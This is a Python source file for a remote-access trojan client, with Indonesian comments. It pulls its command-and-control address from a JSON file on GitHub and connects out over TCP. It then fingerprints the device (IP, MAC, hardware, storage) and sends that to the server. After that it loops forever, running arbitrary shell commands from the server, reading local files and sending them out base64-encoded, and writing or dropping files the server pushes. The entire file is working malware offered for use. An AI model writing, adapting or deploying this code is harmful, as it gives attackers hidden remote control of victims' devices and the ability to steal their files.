import socket, json, os, base64, time, subprocess, sys, importlib.util, platform, requests, uuid, shutil

# === AUTO INSTALL MODULE ===
def ensure(package, module=None):
    try:
        if module is None:
            module = package
        if importlib.util.find_spec(module) is None:
            print(f"[INFO] Installing: {package}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"[ERROR] Cannot install {package}: {e}")

for mod in ["requests"]:
    ensure(mod)

CONFIG_URL = "https://raw.githubusercontent.com/ExsoKamabay/Api-scrap/refs/heads/master/kmy_scrap/files.json"

# === KONFIG CLIENT (baca bagian 'client' dari JSON) ===
def get_server_target():
    """
    CLIENT WAJIB ambil host/port dari bagian 'client' di files.json
    Contoh:
    {
      "server": {"host": "0.0.0.0", "port": 8080},
      "client": {"host": "0.tcp.ap.ngrok.io", "port": 15799}
    }
    """
    try:
        res = requests.get(CONFIG_URL, timeout=6)
        cfg = res.json()
        host = cfg["client"]["host"]
        port = int(cfg["client"]["port"])
        return host, port
    except Exception:
        # fallback supaya bisa dites lokal
        return "127.0.0.1", 8080

# === UTIL ===
def safe(val, default="----"):
    try:
        return val() if callable(val) else (val if val else default)
    except Exception:
        return default

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception:
        return "----"

def get_mac():
    try:
        node = uuid.getnode()
        return ":".join(f"{(node >> i) & 0xff:02x}" for i in range(40, -1, -8))
    except Exception:
        return "----"

# === DETEKSI PERANGKAT MENGGUNAKAN PERINTAH OS ===
def info_android_termux():
    def prop(k):
        try:
            return os.popen(f"getprop {k}").read().strip() or "----"
        except Exception:
            return "----"

    try:
        du = shutil.disk_usage("/")
        tot = round(du.total / (1024**3), 2)
        used = round(du.used / (1024**3), 2)
        free = round(du.free / (1024**3), 2)
    except Exception:
        tot = used = free = "----"

    return {
        "hostname": platform.node() or "----",
        "ip": get_public_ip(),
        "mac": get_mac(),
        "location": "----",
        "system": "Android",
        "release": prop("ro.build.version.release"),
        "brand": prop("ro.product.brand"),
        "model": prop("ro.product.model"),
        "processor": platform.processor() or "----",
        "ram_total_gb": safe(lambda: round(int(os.popen("cat /proc/meminfo | grep MemTotal | awk '{print $2}'").read().strip() or "0")/1024/1024, 2), "----"),
        "storage_total_gb": tot,
        "storage_used_gb": used,
        "storage_free_gb": free,
        "cpu_count": os.cpu_count() or "----",
        "cwd": safe(os.getcwd, "----"),
        "architecture": platform.machine() or "----",
        "version": platform.version() or "----",
    }

def info_linux():
    try:
        du = shutil.disk_usage("/")
        tot = round(du.total / (1024**3), 2)
        used = round(du.used / (1024**3), 2)
        free = round(du.free / (1024**3), 2)
    except Exception:
        tot = used = free = "----"

    # Usaha ambil brand/model via DMI kalau ada
    def readfile(p):
        try:
            return open(p).read().strip()
        except Exception:
            return "----"

    brand = readfile("/sys/devices/virtual/dmi/id/sys_vendor")
    model = readfile("/sys/devices/virtual/dmi/id/product_name")

    return {
        "hostname": platform.node() or "----",
        "ip": get_public_ip(),
        "mac": get_mac(),
        "location": "----",
        "system": platform.system() or "Linux",
        "release": platform.release() or "----",
        "brand": brand,
        "model": model if model != "----" else platform.machine(),
        "processor": platform.processor() or safe(lambda: os.popen("lscpu | grep 'Model name' | cut -d: -f2").read().strip(), "----"),
        "ram_total_gb": safe(lambda: round(int(os.popen("grep MemTotal /proc/meminfo | awk '{print $2}'").read().strip() or "0")/1024/1024, 2), "----"),
        "storage_total_gb": tot,
        "storage_used_gb": used,
        "storage_free_gb": free,
        "cpu_count": os.cpu_count() or "----",
        "cwd": safe(os.getcwd, "----"),
        "architecture": platform.machine() or "----",
        "version": platform.version() or "----",
    }

def info_windows():
    try:
        du = shutil.disk_usage(os.environ.get("SystemDrive", "C:") + "\\")
        tot = round(du.total / (1024**3), 2)
        used = round(du.used / (1024**3), 2)
        free = round(du.free / (1024**3), 2)
    except Exception:
        tot = used = free = "----"

    # wmic (Windows lama) atau REG
    try:
        brand = os.popen('wmic computersystem get manufacturer').read().strip().splitlines()[-1]
        model = os.popen('wmic computersystem get model').read().strip().splitlines()[-1]
        if not brand or brand.lower().startswith("manufact"): brand = "----"
        if not model or model.lower().startswith("model"): model = "----"
    except Exception:
        brand = model = "----"

    return {
        "hostname": platform.node() or "----",
        "ip": get_public_ip(),
        "mac": get_mac(),
        "location": "----",
        "system": platform.system() or "Windows",
        "release": platform.release() or "----",
        "brand": brand,
        "model": model,
        "processor": platform.processor() or os.environ.get("PROCESSOR_IDENTIFIER", "----"),
        "ram_total_gb": safe(lambda: round(int(os.popen('wmic os get TotalVisibleMemorySize /Value').read().strip().split('=')[-1]) / 1024 / 1024, 2), "----"),
        "storage_total_gb": tot,
        "storage_used_gb": used,
        "storage_free_gb": free,
        "cpu_count": os.cpu_count() or "----",
        "cwd": safe(os.getcwd, "----"),
        "architecture": platform.machine() or "----",
        "version": platform.version() or "----",
    }

def collect_device_info():
    try:
        if os.name == "nt":
            return info_windows()
        # Termux/Android: ada getprop
        if shutil.which("getprop"):
            return info_android_termux()
        return info_linux()
    except Exception as e:
        return {"hostname": "Unknown", "ip": "----", "system": "----", "error": str(e)}

# === KONEKSI DAN PROTOKOL ===
def client_loop():
    while True:
        host, port = get_server_target()  # <-- PENTING: pakai bagian 'client' dari JSON!
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            # kirim info perangkat dulu
            info = collect_device_info()
            s.sendall(json.dumps({"type": "dracOs", "info": info}).encode())

            # loop komando
            while True:
                buf = s.recv(8192)
                if not buf:
                    break
                msg = json.loads(buf.decode())
                mtype = msg.get("type", "")

                if mtype == "command":
                    command = msg.get("command", "")
                    try:
                        if command.startswith("cd "):
                            path = command[3:].strip()
                            os.chdir(path)
                            output = f"Changed directory to {os.getcwd()}"
                        else:
                            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                            out, err = proc.communicate()
                            output = (out or "") + (err or "")
                    except Exception as e:
                        output = f"[ERROR] {e}"
                    s.sendall(json.dumps({"type": "status", "hostname": info.get("hostname", "----"), "message": output}).encode())

                elif mtype == "cfile":
                    content = msg.get("content", "")
                    path = msg.get("path", "out.txt")
                    try:
                        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
                        with open(path, "w", encoding="utf-8") as f:
                            f.write(content)
                        reply = f"File created at {os.path.abspath(path)}"
                    except Exception as e:
                        reply = f"[ERROR] {e}"
                    s.sendall(json.dumps({"type": "status", "hostname": info.get("hostname", "----"), "message": reply}).encode())

                elif mtype == "import":
                    # client -> baca file dan kirim ke server (server akan simpan ke dest)
                    src = msg.get("src", "")
                    dest = msg.get("dest", ".")
                    try:
                        with open(src, "rb") as f:
                            raw = f.read()
                        b64 = base64.b64encode(raw).decode()
                        s.sendall(json.dumps({
                            "type": "file",
                            "hostname": info.get("hostname", "----"),
                            "filename": os.path.basename(src),
                            "data": b64,
                            "dest": dest
                        }).encode())
                    except Exception as e:
                        s.sendall(json.dumps({"type": "status", "hostname": info.get("hostname", "----"), "message": f"[ERROR] {e}"}).encode())

                elif mtype == "export":
                    # server -> kirim file ke client, client tulis ke dest
                    filename = msg.get("filename", "file.bin")
                    dest = msg.get("dest", ".")
                    data_b64 = msg.get("data", "")
                    try:
                        raw = base64.b64decode(data_b64.encode())
                        os.makedirs(dest, exist_ok=True)
                        out_path = os.path.join(dest, filename)
                        with open(out_path, "wb") as f:
                            f.write(raw)
                        s.sendall(json.dumps({"type": "status", "hostname": info.get("hostname", "----"), "message": f"Saved to {out_path}"}).encode())
                    except Exception as e:
                        s.sendall(json.dumps({"type": "status", "hostname": info.get("hostname", "----"), "message": f"[ERROR] {e}"}).encode())

        except Exception as e:
            # koneksi gagal -> tunggu sebentar lalu baca ulang CONFIG_URL (jika ngrok berubah)
            print(f"[ERROR] Connection: {e}")
            time.sleep(4)
            continue

if __name__ == "__main__":
    client_loop()
